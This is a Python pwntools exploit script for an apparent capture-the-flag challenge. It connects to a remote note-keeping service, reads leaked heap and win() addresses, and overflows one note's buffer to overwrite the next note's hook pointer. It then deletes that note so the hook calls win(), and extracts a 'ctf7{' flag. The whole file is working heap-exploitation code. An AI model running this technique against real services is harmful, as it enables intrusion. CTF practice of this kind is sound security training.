#!/usr/bin/env python3
"""
Final attempt: Maybe hook is called when we delete a note
And we need to overwrite the note's function pointer using off-by-one
"""
from pwn import *
import time

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap:  0x{heap:x}")
log.success(f"win(): 0x{win:x}")
log.success(f"hook:  0x{hook:x}")

# Simple approach: overflow to overwrite next note's hook pointer
# Then delete that note to call the hook

# Create note 0 - we'll overflow from this
io.sendline(b'1')
time.sleep(0.1)
io.sendline(b'16')
time.sleep(0.1)
io.sendline(b'A' * 16)
time.sleep(0.2)

# Create note 1 - this will have its hook pointer overwritten
io.sendline(b'1')
time.sleep(0.1)
io.sendline(b'16')
time.sleep(0.1)
io.sendline(b'B' * 16)
time.sleep(0.2)

# Edit note 0 - overflow to overwrite note 1's hook pointer with win()
io.sendline(b'2')
time.sleep(0.1)
io.sendline(b'0')
time.sleep(0.1)
# Append enough bytes to reach note 1's hook pointer
# Note structure might be: [size][data_ptr][hook_ptr][data...]
# We need to overflow: remaining 0 bytes + chunk header (16) + size (8) + data_ptr (8) = 32 bytes
payload = b'C' * 32 + p64(win)
io.sendline(payload)
time.sleep(0.2)

# Delete note 1 - this should call the hook (now pointing to win())
io.sendline(b'3')
time.sleep(0.1)
io.sendline(b'1')
time.sleep(1)

# Get all output
output = io.recvall(timeout=3)
result = output.decode(errors='ignore')

print("\n" + "="*60)
print(result)
print("="*60)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        log.success(f"\n\nFLAG: {flag.group(0)}\n\n")
else:
    log.warning("No flag found")

io.close()
